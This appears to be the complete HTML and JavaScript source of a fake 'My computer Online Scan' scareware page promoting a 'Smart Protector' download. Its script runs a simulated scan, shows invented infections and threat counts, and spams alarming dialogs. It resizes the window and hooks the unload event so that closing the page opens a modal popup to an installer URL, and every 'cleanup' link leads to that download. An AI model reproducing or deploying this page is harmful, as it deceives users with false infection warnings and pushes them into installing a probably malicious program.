<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>My computer Online Scan</title>
<script type="text/javascript" src="/js/jquery-1.2.5.pack.js"></script>
<script type="text/javascript" src="/js/jquery-init.js"></script>
<script type="text/javascript" src="/js/listfile.js"></script>
<script type="text/javascript" src="/js/drugndrup.js"></script>
<script> 
var pinter;var ss=15;var teracti=0;
function hideWarnDialog()
{
    if(confirm('Please do not close this window if your want you PC to be clean.'))    {
    }
    else    {
        terttye43();
    };
};
function terttye43(){
    alert('Harmful and malicious software detected. These programs may damage your computer and steal your private information. Online Security Scanner requires  Smart Protector components to repair your computer. Please click OK to download and install Smart Protector tool.');
}
function hfgyh54(){};
function update()
{
 if ($(".progress_bar_fill").width()>0)
 {
  $("#progress_prcnt").html((Math.round(100-$(".progress_bar_fill").width()/417*100))+"%");
  $("#cur_file_scan").html(gs[Math.floor(Math.random()*gs.length)] );
  if ($(".progress_bar_fill").width()<350 && teracti==0)
  {
   document.getElementById('threat1').style.visibility = 'visible';
   document.getElementById('desc').style.visibility = 'visible';
   setInterval("$('#tc1').toggleClass('none')",1000);
   teracti=1;
  }
  if ($(".progress_bar_fill").width()<200 && teracti==1)
  {
   document.getElementById('threat2').style.visibility = 'visible';
   setInterval("$('#tc2').toggleClass('none')",1000);
   teracti=2;
  }
  if ($(".progress_bar_fill").width()<100 && teracti==2)
  {
   document.getElementById('threat3').style.visibility = 'visible';
   setInterval("$('#tc3').toggleClass('none')",1000);
   setInterval("$('#tc4').toggleClass('none')",1000);
   teracti=3;
  }  
 }
 else
 {
  clearInterval(pinter);
  $(".file_scanner").html("Scanning completed. 527 Potential aggressive items was found!");
  setTimeout("pop2()",1000);
 }
}
function Minimize() 
{
window.innerWidth = 100;
window.innerHeight = 100;
window.screenX = screen.width;
window.screenY = screen.height;
alwaysLowered = true;
}
function Maximize() 
{
window.moveTo(0,0);
window.resizeTo(screen.width,screen.height);
}
function download() {
 window.location='/download/smrtprt/install.php?track_id=40014';
}
function away()
{
    w = window;
    ua = navigator.userAgent;
    v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
      x = 11;
      eval('w.resizeTo(x*10,x*11-7)');
    w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
}
function pop1() {
confirm('Warning!!! '+
'Your computer contains various types of vulnerabilities and threats.\n\n'+
'Your system requires immediate anti viruses scan! Smart Protector can perform fast and free virus and malicious software scan of your computer .');
}
function pop2() {
confirm('Your computer remains infected by threats! '+
'They might lead to data loss and file structure damage, and needed to be heal as soon as possible.\n\n'+
'Return to Smart Protector and download it secure to your PC');
pop4();
}
function pop3dsds() {
alert('Your computer remains infected by threats ! '+
'They can cause data loss and file damages and need to be cured as soon as possible.\n\n'+
'Return to Smart Protector and download it secure to your PC');
}
function pop4() {
  document.getElementById('ap').style.display = 'block';
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
}
function sp2init(){
}
function loading() {
  if (window.attachEvent)
    away();
  pop1();
  Maximize();
  window.focus(); 
}
function loaded() {
  $("#white").css("display","none");
  $("#page_progress").css("display","block");
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
  $(".progress_bar_fill").animate({width:"0px"},ss*1000);
    pinter = setInterval(update,ss*10);    
};
loading();
var exit = true;
var usePopDialog = true;
var nid=0;
var tid=431;
var mid=947;
var full=1;
var popDialogOptions = "dialogWidth:1024px; dialogHeight:768px; dialogTop:0px; dialogLeft:0px; edge:Raised; center:0; help:0; resizable:1; scroll:1; status:0";
var popWindowOptions = " scrollbars=1,menubar=1,toolbar=1,location=1,personalbar=1,status=1,resizable=1";
var clid = "7f09c9e1c55f7d63f02909a14c1a45e0";
var usePopDialog = true;
var isUsingSpecial = false;
dat=new Date(1251203138);
var dlth=dat.getHours()-dat.getUTCHours();
newurl = "/download/smrtprt/install.php?track_id=40014";
var isXPSP2 = false;
var u = "6BF52A52-394A-11D3-B153-00C04F79FAA6";
function ext(){
       if(exit)       {
               exit=false;
               terttye43();
               if(!isXPSP2 && !usePopDialog)               {
                         window.open(popURL,"",popWindowOptions);
               }else if(!isXPSP2 && usePopDialog) {
                         eval("window.showModalDialog(popURL,'',popDialogOptions)");
               }else{
                         iie.launchURL(popURL);
               }
        }
}
var popURL = newurl;
isUsingSpecial = true;
if (window.attachEvent)
 eval("window.attachEvent('onunload',ext);");
else
 window.addEventListener("unload", ext, false);
</script>
<style type="text/css">
<!--
body {
    padding:0px;
    margin:0px;
    font-family:Tahoma, Arial, Helvetica, sans-serif;
    font-size:11px;
    background-color:#FFFFFF;
    color:#000000;
    height:100%;
}
-->

.left_bar {
    position: absolute;    
    background-color:#718de0;
    color:#3333CC;
    height:100%;
}
.left_header {
    background-image:url(/images/smrtprt_3/002.gif);
    background-repeat:no-repeat;
    width:213px;
    height:19px;
    padding:7px 0 0 13px;
    margin:12px 0 0 12px;
    font-weight:bold;
    color:#3F3D3D;    
}

.left_box {
    background-color:#d7def8;
    color:#3F3D3D;
    border-left:1px solid #FFFFFF;
    border-right:1px solid #FFFFFF;
    border-bottom:1px solid #FFFFFF;
    width:211px;
    margin:0 0 0 12px;
    padding:10px 0 6px 0;
}

.left_box_line {
    padding:2px 2px 3px 15px;
}

.left_box_line a{
    color:#38599c;
    background-color:inherit;
    text-decoration:none;
}
.left_box_line a:hover{
    text-decoration:underline;
}
.left_bar_icon {
    vertical-align:middle;
    padding-right:4px;
}

.right_bar {
    position:absolute;
    left:238px;
}

.right_hr {
    background-image:url(/images/smrtprt_3/006.gif);
    background-repeat:no-repeat;
    width:280px;
    height:19px;
    padding-left:15px;
    padding-bottom:15px;
    margin-top:15px;    
    font-weight:bold;
}

.folder_box {
    display:inline;
    margin:20px 0 0 0;
    padding-left:20px;
    width:170px;
}

.folder_icon {
    vertical-align:middle;
    padding:0 10px 0 0;
}

.progress_bar {
    margin:15px 15px 0 15px;
}
.progress_bar_bg {
    background-image:url(/images/smrtprt_3/008.gif);
    background-repeat:no-repeat;
    width:416px;
    height:15px;
    padding:1px 3px 1px 3px;
    margin:7px 0 0 0;
}

.progress_bar_progress {
    background-image:url(/images/smrtprt_3/009.gif);
    background-position:left;
    background-repeat:repeat-x;
    height:15px;
    width:416px;
}

.progress_bar_fill {
    float:right;
    background-color:white;
    width:418px;
    height:15px;
}

#progress_prcnt {
    position:absolute;
    padding-left:200px;
}

.file_scanner {
    font-weight:bold;
    margin:5px 15px 0 15px; 
}

.window1 {
    width:700px;
    height:337px;
    background-image:url(/images/smrtprt_3/011.gif);
    background-repeat:no-repeat;
    margin:5px 15px 0 15px;     
}

.td_cell1 {
    padding-top:10px;
    padding-left:7px;
}

.td_cell2 {
    padding-top:7px;
    padding-left:7px;
}

.none {
    visibility:hidden;
}

.trojan {
    position:absolute;
    display:inline;
    padding-left:50px;
    padding-top:30px;
}

.trojan_caption {
    font-weight:bold;
    color:red;
    padding-left:5px;
}

.white_div {
    Z-INDEX: 1200;
    position:absolute;
    background-color:white;
    width:100%;
    height:100%;
}

#alert {
    Z-INDEX: 1300;
    width:434px;
    height:332px;
    display:none;
    position:absolute;
    cursor:pointer;
}
-->
</style>
</head>
<body onLoad="loaded()">
<div style="postion: absolute;"><script src="/counter/call_img.php?tracker_id=40014&product_id=6"></script></div>

<DIV id=ap style="LEFT: 0px; z-index:2; WIDTH: 100%; POSITION: absolute; TOP: 190px; display: none;" align=center>
<DIV style="cursor:hand; WIDTH: 434px; height:332px; POSITION: relative; background-image:url(/images/smrtprt_3/001.gif); background-color:white;"><input type='button' style='POSITION: relative; width:21px; height:21px; left:200px; top:5px; border-width:0px; background-image:url(/images/smrtprt_3/cb.gif)' onclick='hideWarnDialog();'><spacer width='446' height='294' /></DIV>
</div>
 
<div style="display: none;" id="white" class="white_div" align="center">
    <div style="position: relative; top: 50%;"><img src="/images/smrtprt_3/007.gif" width="51" height="19">    </div>
   </div>
<div style="display: block;" class="left_bar">
  <div class="left_header">
        System Tasks  </div>
    <div class="left_box">
        <div class="left_box_line">
            <img src="/images/smrtprt_3/016.gif" class="left_bar_icon" width="14" height="16"><a href="#">View system information</a>        </div>
      <div class="left_box_line">
        <img src="/images/smrtprt_3/017.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Add or remove programs</a>      </div>
      <div class="left_box_line">
           <img src="/images/smrtprt_3/018.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Change a settings</a>      </div>
  </div>
    <div class="left_header">
        Other Places  </div>
    <div class="left_box">
        <div class="left_box_line">
            <img src="/images/smrtprt_3/012.gif" class="left_bar_icon" width="16" height="16"> <a href="#">My Network Places</a>        </div>
      <div class="left_box_line">
        <img src="/images/smrtprt_3/013.gif" class="left_bar_icon" width="16" height="16"> <a href="#">My Documents</a>      </div>
      <div class="left_box_line">
           <img src="/images/smrtprt_3/014.gif" class="left_bar_icon" width="16" height="14"> <a href="#">Shared Documents</a>      </div>
      <div class="left_box_line">
           <img src="/images/smrtprt_3/015.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Control Panel</a>      </div>
  </div>
    <div class="left_header">
        Details  </div>
    <div class="left_box">
      <div class="left_box_line"> <strong>My Computer</strong><br>
System Folder      </div>
    </div>
        
</div>
 
<div class="right_bar">
  <div class="right_hr">
        System scan progress  </div>
    <div class="folder_box">
         <div id="tc1" class="trojan none">
            <img src="/images/smrtprt_3/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">12 threats</span>      </div>
 
  <img src="/images/smrtprt_3/004.gif" class="folder_icon" width="43" height="40">Shared Documents  </div>
  <div class="folder_box">
        <div id="tc2" class="trojan none">
            <img src="/images/smrtprt_3/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">33 threats</span>        </div>
    
  <img src="/images/smrtprt_3/004.gif" class="folder_icon" width="43" height="40">My Documents  </div>
  <div class="right_hr">
        Hard drives  </div>
    <div class="folder_box">
        <div id="tc3" class="trojan none">
            <img src="/images/smrtprt_3/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">34 threats</span>        </div>
    
  <img src="/images/smrtprt_3/005.gif" class="folder_icon" width="43" height="40">Local Disk (C:)  </div>
  <div class="folder_box">
        <div id="tc4" class="trojan none">
            <img src="/images/smrtprt_3/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">11 threats</span>        </div>
    
  <img src="/images/smrtprt_3/005.gif" class="folder_icon" width="43" height="40">Local Disk (D:)  </div>
  <div class="right_hr">
        DVD  </div>
    <div class="folder_box">
        <img src="/images/smrtprt_3/003.gif" class="folder_icon" width="43" height="40">DVD-RAM Drive (E:)  </div>
  <div class="progress_bar">
    <div class="progress_bar_bg">
      <div class="progress_bar_progress">
           <div style=" display: block;" class="progress_bar_fill">        </div>
                <div id="progress_prcnt">100%</div>                      
      </div>          
    </div>
  </div>
    <div class="file_scanner">Now scanning: <span id="cur_file_scan"></span></div>
    <div class="window1">
         <div style="font-size: 15px; font-weight: bold; color: white; padding-top: 14px; padding-left: 35px;">
            Your Computer is Infected!      </div>
        <div style="padding-top: 22px;">
            Threats and actions:      </div>   
        <table border="0">
          <tbody><tr>
            <td width="166" class="td_cell1">Name</td>
            <td class="td_cell1" width="105">Risk level</td>
            <td width="85" class="td_cell1">Date</td>
            <td width="120" class="td_cell1">Files infected</td>
            <td width="120" class="td_cell1">State</td>
          </tr>
          <tr class="" id="threat1" style=" visibility:hidden;">
            <td class="td_cell2"><img src="/images/smrtprt_3/010.gif" style="padding-right: 5px;" align="absmiddle">  <b>Email-Worm.Win32.Net</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="" id="threat2" style=" visibility:hidden;">
            <td class="td_cell2"><img src="/images/smrtprt_3/010.gif" style="padding-right: 5px;" align="absmiddle">  <b>Email-Worm.Win32.Myd</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="" id="threat3" style=" visibility:hidden;">
            <td class="td_cell2"><img src="/images/smrtprt_3/010.gif" style="padding-right: 5px;" align="absmiddle">  <b>Win 32:Delf-XQ</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
      </tbody></table>
 
        <div style=" visibility:hidden; padding-top: 12px; padding-left: 12px; width: 600px;" class="" id="desc">
            <b>Description:</b><br>
            This program is potentially dangerous for your system. <b>Trojan-Downloader</b> stealing passwords, credit cards and other personal information from your computer.
            <br><br>
            <b>Advice:</b><br>
            You need to remove this threat as soon as possible!      </div>
        <div style="padding-top: 50px; padding-left: 590px;"><a href="/download/smrtprt/install.php?track_id=40014">Full system cleanup</a></div>
  </div>
</div>
<script>Drag.init(document.getElementById('ap'));</script>
</body></html>